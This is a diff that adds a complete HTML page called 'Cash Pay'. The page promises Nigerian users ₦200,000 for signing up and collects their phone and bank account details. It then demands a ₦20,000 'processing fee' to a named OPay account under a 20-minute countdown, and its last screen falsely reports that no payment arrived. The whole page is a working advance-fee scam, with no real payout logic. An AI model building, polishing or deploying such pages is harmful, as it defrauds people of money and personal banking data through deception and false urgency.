@@ -1,0 +1,123 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cash Pay</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 40px 20px;
+      background-color: #f2f2f2;
+      text-align: center;
+    }
+    .screen {
+      display: none;
+      max-width: 400px;
+      margin: auto;
+      background: #fff;
+      padding: 30px 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    .screen.active {
+      display: block;
+    }
+    h1 {
+      color: #00796b;
+    }
+    p {
+      font-size: 16px;
+      color: #333;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    button {
+      margin-top: 20px;
+      background-color: #007bff;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .timer {
+      font-size: 24px;
+      font-weight: bold;
+      margin: 20px 0;
+      color: red;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Screen 1: Welcome -->
+  <div class="screen active" id="screen1">
+    <h1>Welcome to Cash Pay!</h1>
+    <p>This app rewards Nigerians with ₦200,000 just for signing up with a valid Nigerian phone number.</p>
+    <p><strong>Important:</strong> To withdraw your funds to a Nigerian bank account, a 10% processing fee (₦20,000) is required.</p>
+    <p>Kindly tap “Next” to sign up and claim your reward.</p>
+    <button onclick="nextScreen(2)">Next</button>
+  </div>
+
+  <!-- Screen 2: Sign Up -->
+  <div class="screen" id="screen2">
+    <h1>Sign Up to Claim Your ₦200,000</h1>
+    <input type="tel" placeholder="Phone Number" required><br>
+    <input type="text" placeholder="Account Number" required><br>
+    <input type="text" placeholder="Account Name" required><br>
+    <input type="text" placeholder="Bank Name" required><br>
+    <button onclick="nextScreen(3)">Next</button>
+  </div>
+
+  <!-- Screen 3: Payment Instructions -->
+  <div class="screen" id="screen3">
+    <h1>Withdraw to Your Bank Account</h1>
+    <p>To process your withdrawal of ₦200,000, a ₦20,000 processing fee is required.</p>
+    <p>Kindly make your payment to the account below within 20 minutes:</p>
+    <p><strong>Account Number:</strong> 8133150641<br>
+       <strong>Bank Name:</strong> OPay Digital Services Limited<br>
+       <strong>Account Name:</strong> Haizi Adam</p>
+    <div class="timer" id="countdown">20:00</div>
+    <button onclick="nextScreen(4)">I Have Made Payment</button>
+  </div>
+
+  <!-- Screen 4: Payment Not Received -->
+  <div class="screen" id="screen4">
+    <h1>Payment Not Received</h1>
+    <p>Our system has not detected your payment.</p>
+    <p>Please ensure that you have sent the ₦20,000 to the account provided before continuing.</p>
+    <p>Try again after making the payment.</p>
+  </div>
+
+  <script>
+    function nextScreen(num) {
+      for (let i = 1; i <= 4; i++) {
+        document.getElementById('screen' + i).classList.remove('active');
+      }
+      document.getElementById('screen' + num).classList.add('active');
+
+      if (num === 3) startTimer(20 * 60); // Start 20-minute timer
+    }
+
+    function startTimer(seconds) {
+      let timeLeft = seconds;
+      const countdown = document.getElementById('countdown');
+      const interval = setInterval(() => {
+        const minutes = Math.floor(timeLeft / 60);
+        const secs = timeLeft % 60;
+        countdown.textContent = `${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+        timeLeft--;
+        if (timeLeft < 0) clearInterval(interval);
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
